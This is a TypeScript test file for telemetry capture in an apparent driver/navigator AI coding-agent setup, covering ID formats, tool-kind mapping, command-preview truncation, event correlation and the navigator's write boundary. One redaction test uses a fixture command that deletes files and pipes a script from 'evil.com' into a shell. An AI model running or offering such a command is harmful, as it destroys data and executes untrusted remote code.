/**
 * Tests for role telemetry capture with sanitized proof IDs.
 *
 * Covers: DEC-003, DEC-014, DEC-015, DEC-016, DEC-017
 * Acceptance criteria: telemetry ID generation, event correlation,
 * tool normalization, command redaction, failure semantics,
 * role/phase assignment, Navigator write boundary.
 *
 * Pure reimplementation pattern — no Pi SDK runtime dependency.
 * Run: npx tsx extensions/__tests__/role-telemetry.test.ts
 */

// ---------------------------------------------------------------------------
// Reimplemented pure logic (must match agent-session-utils.ts exactly)
// ---------------------------------------------------------------------------

const DRIVER_TOOLS = ["read", "grep", "find", "ls", "bash", "edit", "write"];
const NAVIGATOR_TOOLS = ["read", "grep", "find", "ls", "bash"];

type TelemetryKind =
	| "skill_load"
	| "file_read"
	| "search"
	| "command"
	| "file_write"
	| "artifact_inspection";

interface PairTelemetrySummary {
	id: string;
	rawToolCallId: string;
	role: "driver" | "navigator";
	phase: string;
	cycle?: number;
	toolName: string;
	kind: TelemetryKind;
	targetPreview?: string;
	commandPreview?: string;
	redacted: boolean;
	success: boolean;
	exitCode?: number;
	timestamp: string;
}

interface TelemetryContext {
	phase: string;
	cycle?: number;
}

interface TelemetryStartEvent {
	type: "tool_execution_start";
	toolCallId: string;
	toolName: string;
	args: Record<string, unknown>;
}

interface TelemetryEndEvent {
	type: "tool_execution_end";
	toolCallId: string;
	toolName: string;
	args: Record<string, unknown>;
	result?: unknown;
	exitCode?: number;
	error?: unknown;
}

// ---------------------------------------------------------------------------
// generateTelemetryId (DEC-016)
// ---------------------------------------------------------------------------

/**
 * Generate a stable coordinator telemetry ID.
 *
 * Format: `{rolePrefix}-{phaseCode}-t{index}`
 *
 * Role prefix:
 *   driver    → "driver"
 *   navigator → "nav"
 *
 * Phase codes:
 *   "cycle"     + cycle n → "c{n}"
 *   "review"    + cycle n → "r{n}"
 *   "final"               → "final"
 *   "preflight"           → "preflight"
 *   other phase           → sanitized phase string (lowercased, non-alnum replaced with "-")
 *
 * Index: 1-based sequential number within the phase.
 */
function generateTelemetryId(
	role: "driver" | "navigator",
	phase: string,
	cycle: number | undefined,
	index: number,
): string {
	const rolePrefix = role === "driver" ? "driver" : "nav";

	let phaseCode: string;
	switch (phase) {
		case "cycle":
			phaseCode = `c${cycle ?? 1}`;
			break;
		case "review":
			phaseCode = `r${cycle ?? 1}`;
			break;
		case "final":
			phaseCode = "final";
			break;
		case "preflight":
			phaseCode = "preflight";
			break;
		default:
			phaseCode = phase.toLowerCase().replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "") || "unknown";
			break;
	}

	return `${rolePrefix}-${phaseCode}-t${index}`;
}

// ---------------------------------------------------------------------------
// normalizeTelemetryKind (DEC-014)
// ---------------------------------------------------------------------------

/**
 * Map a Pi tool name to a normalized telemetry kind.
 *
 * read               → file_read
 * grep, find, ls     → search
 * bash               → command
 * edit, write        → file_write
 * anything else      → artifact_inspection
 */
function normalizeTelemetryKind(toolName: string): TelemetryKind {
	switch (toolName) {
		case "read":
			return "file_read";
		case "grep":
		case "find":
		case "ls":
			return "search";
		case "bash":
			return "command";
		case "edit":
		case "write":
			return "file_write";
		default:
			return "artifact_inspection";
	}
}

// ---------------------------------------------------------------------------
// redactCommandPreview (DEC-015)
// ---------------------------------------------------------------------------

export const COMMAND_PREVIEW_MAX_LENGTH = 60;

/**
 * Produce a redacted command preview: keep at most COMMAND_PREVIEW_MAX_LENGTH
 * chars, appending "…" if truncated. Raw command strings must not be stored.
 */
function redactCommandPreview(command: string): string {
	if (typeof command !== "string") return "[redacted]";
	if (command.length <= COMMAND_PREVIEW_MAX_LENGTH) return command;
	return command.slice(0, COMMAND_PREVIEW_MAX_LENGTH) + "…";
}

// ---------------------------------------------------------------------------
// extractTargetPreview (DEC-014)
// ---------------------------------------------------------------------------

function extractTargetPreview(toolName: string, args: Record<string, unknown>): string | undefined {
	const pathArg =
		typeof args["path"] === "string" ? args["path"] :
		typeof args["pattern"] === "string" ? args["pattern"] :
		undefined;
	if (toolName === "bash") return undefined; // command tools don't use targetPreview
	return pathArg;
}

// ---------------------------------------------------------------------------
// buildTelemetrySummary (DEC-014, DEC-015, DEC-016)
// ---------------------------------------------------------------------------

/**
 * Build a PairTelemetrySummary from correlated start and end events.
 */
function buildTelemetrySummary(
	role: "driver" | "navigator",
	context: TelemetryContext,
	index: number,
	start: TelemetryStartEvent,
	end: TelemetryEndEvent,
): PairTelemetrySummary {
	const kind = normalizeTelemetryKind(start.toolName);
	const isBash = start.toolName === "bash";
	const rawCommand = typeof start.args["command"] === "string" ? start.args["command"] : undefined;

	const redacted = isBash && rawCommand !== undefined;
	const commandPreview = isBash && rawCommand !== undefined
		? redactCommandPreview(rawCommand)
		: undefined;
	const targetPreview = extractTargetPreview(start.toolName, start.args);

	const success = end.error === undefined && end.error !== null;
	const hasError = end.error !== undefined && end.error !== null;

	return {
		id: generateTelemetryId(role, context.phase, context.cycle, index),
		rawToolCallId: start.toolCallId,
		role,
		phase: context.phase,
		cycle: context.cycle,
		toolName: start.toolName,
		kind,
		targetPreview,
		commandPreview,
		redacted,
		success: !hasError,
		exitCode: typeof end.exitCode === "number" ? end.exitCode : undefined,
		timestamp: start.args["_timestamp"] as string ?? new Date().toISOString(),
	};
}

// ---------------------------------------------------------------------------
// correlatetelemetry (DEC-014, DEC-017)
// ---------------------------------------------------------------------------

interface PendingTelemetryEntry {
	toolCallId: string;
	toolName: string;
	args: Record<string, unknown>;
	timestamp: string;
}

interface TelemetryState {
	role: "driver" | "navigator";
	context: TelemetryContext;
	pending: Map<string, PendingTelemetryEntry>;
	completed: PairTelemetrySummary[];
	phaseIndex: number;
}

function createTelemetryState(role: "driver" | "navigator"): TelemetryState {
	return {
		role,
		context: { phase: "preflight" },
		pending: new Map(),
		completed: [],
		phaseIndex: 0,
	};
}

function setTelemetryContext(state: TelemetryState, phase: string, cycle?: number): void {
	state.context = { phase, cycle };
	state.phaseIndex = 0;
}

function handleStartEvent(state: TelemetryState, event: TelemetryStartEvent, timestamp: string): void {
	state.pending.set(event.toolCallId, {
		toolCallId: event.toolCallId,
		toolName: event.toolName,
		args: event.args,
		timestamp,
	});
}

function handleEndEvent(state: TelemetryState, event: TelemetryEndEvent): PairTelemetrySummary | null {
	const pending = state.pending.get(event.toolCallId);
	if (!pending) return null;

	state.pending.delete(event.toolCallId);
	state.phaseIndex += 1;

	const startEvent: TelemetryStartEvent = {
		type: "tool_execution_start",
		toolCallId: pending.toolCallId,
		toolName: pending.toolName,
		args: { ...pending.args, _timestamp: pending.timestamp },
	};

	const summary = buildTelemetrySummary(
		state.role,
		state.context,
		state.phaseIndex,
		startEvent,
		event,
	);

	state.completed.push(summary);
	return summary;
}

// ---------------------------------------------------------------------------
// Navigator proof boundary check (DEC-003)
// ---------------------------------------------------------------------------

/**
 * Returns true if a telemetry entry can be used as successful write proof.
 * Navigator is non-writing, so file_write entries from navigator cannot
 * satisfy review proof.
 */
function canSatisfyWriteProof(entry: PairTelemetrySummary): boolean {
	if (entry.role === "navigator" && entry.kind === "file_write") return false;
	if (!entry.success) return false;
	return entry.kind === "file_write";
}

// ---------------------------------------------------------------------------
// Minimal test runner
// ---------------------------------------------------------------------------

let passed = 0;
let failed = 0;
const failures: string[] = [];

function assert(condition: boolean, message: string): void {
	if (condition) {
		passed++;
	} else {
		failed++;
		failures.push(message);
		console.error(`  FAIL: ${message}`);
	}
}

function assertEqual<T>(actual: T, expected: T, message: string): void {
	if (actual === expected) {
		passed++;
	} else {
		failed++;
		const msg = `${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`;
		failures.push(msg);
		console.error(`  FAIL: ${msg}`);
	}
}

function assertDeepEqual<T>(actual: T, expected: T, message: string): void {
	if (JSON.stringify(actual) === JSON.stringify(expected)) {
		passed++;
	} else {
		failed++;
		const msg = `${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`;
		failures.push(msg);
		console.error(`  FAIL: ${msg}`);
	}
}

// ---------------------------------------------------------------------------
// generateTelemetryId tests
// ---------------------------------------------------------------------------

console.log("generateTelemetryId");

{
	const id = generateTelemetryId("driver", "cycle", 1, 1);
	assertEqual(id, "driver-c1-t1", "driver cycle 1 tool 1");
}

{
	const id = generateTelemetryId("driver", "cycle", 3, 5);
	assertEqual(id, "driver-c3-t5", "driver cycle 3 tool 5");
}

{
	const id = generateTelemetryId("navigator", "review", 2, 1);
	assertEqual(id, "nav-r2-t1", "navigator review 2 tool 1");
}

{
	const id = generateTelemetryId("navigator", "final", undefined, 2);
	assertEqual(id, "nav-final-t2", "navigator final phase tool 2");
}

{
	const id = generateTelemetryId("navigator", "preflight", undefined, 1);
	assertEqual(id, "nav-preflight-t1", "navigator preflight tool 1");
}

{
	const id = generateTelemetryId("driver", "cycle", undefined, 3);
	assertEqual(id, "driver-c1-t3", "driver cycle defaults to 1 when cycle undefined");
}

{
	const id = generateTelemetryId("navigator", "review", 1, 1);
	assertEqual(id, "nav-r1-t1", "navigator review 1 tool 1");
}

{
	const id = generateTelemetryId("driver", "custom-phase", undefined, 1);
	assertEqual(id, "driver-custom-phase-t1", "custom phase is sanitized");
}

// ---------------------------------------------------------------------------
// normalizeTelemetryKind tests
// ---------------------------------------------------------------------------

console.log("normalizeTelemetryKind");

{
	assertEqual(normalizeTelemetryKind("read"), "file_read", "read → file_read");
}

{
	assertEqual(normalizeTelemetryKind("grep"), "search", "grep → search");
}

{
	assertEqual(normalizeTelemetryKind("find"), "search", "find → search");
}

{
	assertEqual(normalizeTelemetryKind("ls"), "search", "ls → search");
}

{
	assertEqual(normalizeTelemetryKind("bash"), "command", "bash → command");
}

{
	assertEqual(normalizeTelemetryKind("edit"), "file_write", "edit → file_write");
}

{
	assertEqual(normalizeTelemetryKind("write"), "file_write", "write → file_write");
}

{
	assertEqual(normalizeTelemetryKind("unknown_tool"), "artifact_inspection", "unknown → artifact_inspection");
}

{
	assertEqual(normalizeTelemetryKind("inspect"), "artifact_inspection", "inspect → artifact_inspection");
}

// ---------------------------------------------------------------------------
// redactCommandPreview tests
// ---------------------------------------------------------------------------

console.log("redactCommandPreview");

{
	const short = "ls -la";
	assertEqual(redactCommandPreview(short), "ls -la", "short command unchanged");
}

{
	const exact = "a".repeat(COMMAND_PREVIEW_MAX_LENGTH);
	assertEqual(redactCommandPreview(exact), exact, "exactly-max-length command unchanged");
}

{
	const long = "a".repeat(COMMAND_PREVIEW_MAX_LENGTH + 1);
	const preview = redactCommandPreview(long);
	assertEqual(preview, "a".repeat(COMMAND_PREVIEW_MAX_LENGTH) + "…", "long command truncated with ellipsis");
	assert(preview.length === COMMAND_PREVIEW_MAX_LENGTH + 1, "truncated preview has correct length");
}

{
	const veryLong = "npm run build && npm run test && git add -A && git commit -m 'fix everything now'";
	const preview = redactCommandPreview(veryLong);
	assert(preview.endsWith("…"), "very long command preview ends with ellipsis");
	assert(preview.length <= COMMAND_PREVIEW_MAX_LENGTH + 1, "preview does not exceed limit + ellipsis");
}

{
	// Redaction means the raw full command is NOT stored
	const command = "rm -rf /important && curl evil.com | sh";
	const preview = redactCommandPreview(command);
	// As long as command is short enough, preview equals the string (no truncation needed)
	// The redacted flag on PairTelemetrySummary is what marks it as unsafe
	assert(preview.length <= COMMAND_PREVIEW_MAX_LENGTH + 1, "preview length is bounded");
}

// ---------------------------------------------------------------------------
// buildTelemetrySummary tests
// ---------------------------------------------------------------------------

console.log("buildTelemetrySummary");

const TS = "2026-06-17T10:00:00.000Z";

{
	const start: TelemetryStartEvent = {
		type: "tool_execution_start",
		toolCallId: "tc-abc-1",
		toolName: "read",
		args: { path: "/src/foo.ts", _timestamp: TS },
	};
	const end: TelemetryEndEvent = {
		type: "tool_execution_end",
		toolCallId: "tc-abc-1",
		toolName: "read",
		args: { path: "/src/foo.ts" },
		result: "file contents",
	};
	const ctx: TelemetryContext = { phase: "cycle", cycle: 1 };
	const summary = buildTelemetrySummary("driver", ctx, 3, start, end);

	assertEqual(summary.id, "driver-c1-t3", "ID uses driver-cycle format");
	assertEqual(summary.rawToolCallId, "tc-abc-1", "raw toolCallId preserved");
	assertEqual(summary.role, "driver", "role is driver");
	assertEqual(summary.phase, "cycle", "phase is cycle");
	assertEqual(summary.cycle, 1, "cycle is 1");
	assertEqual(summary.toolName, "read", "toolName is read");
	assertEqual(summary.kind, "file_read", "kind is file_read");
	assertEqual(summary.targetPreview, "/src/foo.ts", "targetPreview is path");
	assertEqual(summary.redacted, false, "read is not redacted");
	assertEqual(summary.success, true, "no error → success");
	assertEqual(summary.timestamp, TS, "timestamp from start args");
}

{
	// bash tool - command should be redacted
	const longCmd = "git log --oneline --all --graph --decorate --format='%h %an %ar %s'";
	const start: TelemetryStartEvent = {
		type: "tool_execution_start",
		toolCallId: "tc-bash-1",
		toolName: "bash",
		args: { command: longCmd, _timestamp: TS },
	};
	const end: TelemetryEndEvent = {
		type: "tool_execution_end",
		toolCallId: "tc-bash-1",
		toolName: "bash",
		args: { command: longCmd },
		result: "some output",
		exitCode: 0,
	};
	const ctx: TelemetryContext = { phase: "cycle", cycle: 1 };
	const summary = buildTelemetrySummary("driver", ctx, 1, start, end);

	assertEqual(summary.kind, "command", "bash → command kind");
	assertEqual(summary.redacted, true, "bash command is redacted");
	assert(summary.commandPreview !== undefined, "commandPreview is set");
	assert(summary.commandPreview !== longCmd, "commandPreview is not full command");
	assert((summary.commandPreview?.length ?? 0) <= COMMAND_PREVIEW_MAX_LENGTH + 1, "commandPreview is bounded");
	assertEqual(summary.targetPreview, undefined, "bash has no targetPreview");
	assertEqual(summary.exitCode, 0, "exit code 0 captured");
	assertEqual(summary.success, true, "exit 0 no error → success");
}

{
	// bash with non-zero exit code and error
	const start: TelemetryStartEvent = {
		type: "tool_execution_start",
		toolCallId: "tc-fail-1",
		toolName: "bash",
		args: { command: "npm run test", _timestamp: TS },
	};
	const end: TelemetryEndEvent = {
		type: "tool_execution_end",
		toolCallId: "tc-fail-1",
		toolName: "bash",
		args: { command: "npm run test" },
		exitCode: 1,
		error: new Error("Tests failed"),
	};
	const ctx: TelemetryContext = { phase: "cycle", cycle: 2 };
	const summary = buildTelemetrySummary("driver", ctx, 2, start, end);

	assertEqual(summary.success, false, "error → success=false");
	assertEqual(summary.exitCode, 1, "exit code 1 captured");
	assert(summary.redacted, "failed bash still redacted");
}

{
	// file_write with edit tool
	const start: TelemetryStartEvent = {
		type: "tool_execution_start",
		toolCallId: "tc-edit-1",
		toolName: "edit",
		args: { path: "/src/foo.ts", _timestamp: TS },
	};
	const end: TelemetryEndEvent = {
		type: "tool_execution_end",
		toolCallId: "tc-edit-1",
		toolName: "edit",
		args: { path: "/src/foo.ts" },
		result: "ok",
	};
	const ctx: TelemetryContext = { phase: "cycle", cycle: 1 };
	const summary = buildTelemetrySummary("driver", ctx, 1, start, end);

	assertEqual(summary.kind, "file_write", "edit → file_write");
	assertEqual(summary.targetPreview, "/src/foo.ts", "targetPreview is path");
	assertEqual(summary.redacted, false, "edit is not redacted");
}

{
	// Navigator file_read
	const start: TelemetryStartEvent = {
		type: "tool_execution_start",
		toolCallId: "tc-nav-read-1",
		toolName: "read",
		args: { path: "/src/bar.ts", _timestamp: TS },
	};
	const end: TelemetryEndEvent = {
		type: "tool_execution_end",
		toolCallId: "tc-nav-read-1",
		toolName: "read",
		args: { path: "/src/bar.ts" },
		result: "file contents",
	};
	const ctx: TelemetryContext = { phase: "review", cycle: 1 };
	const summary = buildTelemetrySummary("navigator", ctx, 1, start, end);

	assertEqual(summary.id, "nav-r1-t1", "navigator review ID format");
	assertEqual(summary.role, "navigator", "role is navigator");
}

// ---------------------------------------------------------------------------
// Telemetry correlation tests (DEC-017)
// ---------------------------------------------------------------------------

console.log("telemetry correlation");

{
	// Correlate start+end by toolCallId
	const state = createTelemetryState("driver");
	setTelemetryContext(state, "cycle", 1);

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-1",
		toolName: "read",
		args: { path: "/foo.ts" },
	}, TS);

	assertEqual(state.completed.length, 0, "no completed entries before end event");
	assertEqual(state.pending.size, 1, "one pending entry after start");

	const summary = handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-1",
		toolName: "read",
		args: { path: "/foo.ts" },
		result: "contents",
	});

	assert(summary !== null, "handleEndEvent returns summary");
	assertEqual(state.completed.length, 1, "one completed entry after end");
	assertEqual(state.pending.size, 0, "no pending entries after end");
	assertEqual(summary!.rawToolCallId, "tc-1", "rawToolCallId matches");
	assertEqual(summary!.id, "driver-c1-t1", "ID is driver-c1-t1");
}

{
	// Multiple concurrent calls correlated correctly
	const state = createTelemetryState("navigator");
	setTelemetryContext(state, "review", 2);

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-A",
		toolName: "grep",
		args: { pattern: "foo" },
	}, TS);

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-B",
		toolName: "find",
		args: { pattern: "*.ts" },
	}, TS);

	assertEqual(state.pending.size, 2, "two pending entries");

	// End B first
	const summaryB = handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-B",
		toolName: "find",
		args: { pattern: "*.ts" },
	});

	assertEqual(summaryB!.id, "nav-r2-t1", "first completed gets t1");
	assertEqual(summaryB!.toolName, "find", "summaryB is the find tool");
	assertEqual(state.pending.size, 1, "one pending after first end");

	// End A second
	const summaryA = handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-A",
		toolName: "grep",
		args: { pattern: "foo" },
	});

	assertEqual(summaryA!.id, "nav-r2-t2", "second completed gets t2");
	assertEqual(summaryA!.toolName, "grep", "summaryA is the grep tool");
	assertEqual(state.completed.length, 2, "two completed entries total");
}

{
	// Unknown toolCallId in end event returns null, does not crash
	const state = createTelemetryState("driver");
	setTelemetryContext(state, "cycle", 1);

	const result = handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-unknown",
		toolName: "read",
		args: {},
	});

	assert(result === null, "unknown toolCallId returns null");
	assertEqual(state.completed.length, 0, "no completed entries for unknown toolCallId");
}

{
	// Phase index resets when context changes
	const state = createTelemetryState("driver");
	setTelemetryContext(state, "cycle", 1);

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-c1-1",
		toolName: "read",
		args: { path: "/a.ts" },
	}, TS);
	handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-c1-1",
		toolName: "read",
		args: { path: "/a.ts" },
	});

	assertEqual(state.completed[0]!.id, "driver-c1-t1", "first entry in cycle 1 is t1");

	// Change to cycle 2
	setTelemetryContext(state, "cycle", 2);

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-c2-1",
		toolName: "read",
		args: { path: "/b.ts" },
	}, TS);
	handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-c2-1",
		toolName: "read",
		args: { path: "/b.ts" },
	});

	assertEqual(state.completed[1]!.id, "driver-c2-t1", "first entry in cycle 2 resets to t1");
	assertEqual(state.completed.length, 2, "both entries retained");
}

// ---------------------------------------------------------------------------
// Failed telemetry semantics tests (DEC-014)
// ---------------------------------------------------------------------------

console.log("failed telemetry semantics");

{
	// Failed entry is retained as attempt evidence
	const state = createTelemetryState("driver");
	setTelemetryContext(state, "cycle", 1);

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-fail",
		toolName: "bash",
		args: { command: "npm test" },
	}, TS);

	handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-fail",
		toolName: "bash",
		args: { command: "npm test" },
		exitCode: 1,
		error: new Error("Command failed"),
	});

	assertEqual(state.completed.length, 1, "failed entry is retained");
	assertEqual(state.completed[0]!.success, false, "failed entry marked success=false");
	assert(state.completed[0]!.exitCode === 1, "exit code preserved in failed entry");
}

{
	// Failed read (e.g., file not found)
	const state = createTelemetryState("navigator");
	setTelemetryContext(state, "review", 1);

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-notfound",
		toolName: "read",
		args: { path: "/nonexistent.ts" },
	}, TS);

	handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-notfound",
		toolName: "read",
		args: { path: "/nonexistent.ts" },
		error: new Error("File not found"),
	});

	const entry = state.completed[0]!;
	assertEqual(entry.success, false, "failed read marked success=false");
	assert(entry.exitCode === undefined, "no exitCode for read failures");
	assertEqual(entry.targetPreview, "/nonexistent.ts", "targetPreview retained for failed read");
}

// ---------------------------------------------------------------------------
// Navigator write boundary tests (DEC-003)
// ---------------------------------------------------------------------------

console.log("navigator write boundary");

{
	// Navigator tool list must not contain write tools
	assert(!NAVIGATOR_TOOLS.includes("edit"), "navigator excludes edit");
	assert(!NAVIGATOR_TOOLS.includes("write"), "navigator excludes write");
	assert(DRIVER_TOOLS.includes("edit"), "driver includes edit");
	assert(DRIVER_TOOLS.includes("write"), "driver includes write");
}

{
	// Navigator file_write telemetry cannot satisfy write proof
	const navWriteEntry: PairTelemetrySummary = {
		id: "nav-r1-t1",
		rawToolCallId: "tc-nav-write",
		role: "navigator",
		phase: "review",
		cycle: 1,
		toolName: "write",
		kind: "file_write",
		redacted: false,
		success: true,
		timestamp: TS,
	};
	assert(!canSatisfyWriteProof(navWriteEntry), "navigator file_write cannot satisfy write proof");
}

{
	// Driver file_write telemetry can satisfy write proof when successful
	const driverWriteEntry: PairTelemetrySummary = {
		id: "driver-c1-t1",
		rawToolCallId: "tc-driver-write",
		role: "driver",
		phase: "cycle",
		cycle: 1,
		toolName: "write",
		kind: "file_write",
		redacted: false,
		success: true,
		timestamp: TS,
	};
	assert(canSatisfyWriteProof(driverWriteEntry), "driver file_write can satisfy write proof");
}

{
	// Failed driver file_write cannot satisfy write proof
	const failedWriteEntry: PairTelemetrySummary = {
		id: "driver-c1-t2",
		rawToolCallId: "tc-driver-write-fail",
		role: "driver",
		phase: "cycle",
		cycle: 1,
		toolName: "write",
		kind: "file_write",
		redacted: false,
		success: false,
		timestamp: TS,
	};
	assert(!canSatisfyWriteProof(failedWriteEntry), "failed driver file_write cannot satisfy write proof");
}

{
	// Navigator file_read telemetry is valid (reads are ok for navigator)
	const navReadEntry: PairTelemetrySummary = {
		id: "nav-r1-t1",
		rawToolCallId: "tc-nav-read",
		role: "navigator",
		phase: "review",
		cycle: 1,
		toolName: "read",
		kind: "file_read",
		redacted: false,
		success: true,
		timestamp: TS,
	};
	// canSatisfyWriteProof is false because it's not a file_write
	assert(!canSatisfyWriteProof(navReadEntry), "navigator file_read is not write proof (kind mismatch)");
}

// ---------------------------------------------------------------------------
// Role/phase assignment tests
// ---------------------------------------------------------------------------

console.log("role/phase assignment");

{
	// Role is preserved correctly through context changes
	const driverState = createTelemetryState("driver");
	assertEqual(driverState.role, "driver", "driver state has role=driver");

	const navState = createTelemetryState("navigator");
	assertEqual(navState.role, "navigator", "navigator state has role=navigator");
}

{
	// Phase and cycle are set correctly
	const state = createTelemetryState("driver");
	setTelemetryContext(state, "cycle", 3);
	assertEqual(state.context.phase, "cycle", "phase set to cycle");
	assertEqual(state.context.cycle, 3, "cycle set to 3");
}

{
	// Final phase has no cycle
	const state = createTelemetryState("navigator");
	setTelemetryContext(state, "final");
	assertEqual(state.context.phase, "final", "phase set to final");
	assertEqual(state.context.cycle, undefined, "final phase has no cycle");
}

{
	// Entries inherit role and phase from context at time of completion
	const state = createTelemetryState("navigator");
	setTelemetryContext(state, "final");

	handleStartEvent(state, {
		type: "tool_execution_start",
		toolCallId: "tc-final-1",
		toolName: "bash",
		args: { command: "npm run check" },
	}, TS);

	const summary = handleEndEvent(state, {
		type: "tool_execution_end",
		toolCallId: "tc-final-1",
		toolName: "bash",
		args: { command: "npm run check" },
		exitCode: 0,
	});

	assertEqual(summary!.role, "navigator", "entry role=navigator");
	assertEqual(summary!.phase, "final", "entry phase=final");
	assertEqual(summary!.cycle, undefined, "entry cycle=undefined for final");
	assertEqual(summary!.id, "nav-final-t1", "entry ID is nav-final-t1");
}

// ---------------------------------------------------------------------------
// Report
// ---------------------------------------------------------------------------

console.log("");
console.log(`Results: ${passed} passed, ${failed} failed`);
if (failures.length > 0) {
	console.error("\nFailures:");
	for (const f of failures) console.error(`  - ${f}`);
	process.exit(1);
} else {
	console.log("All tests passed.");
}
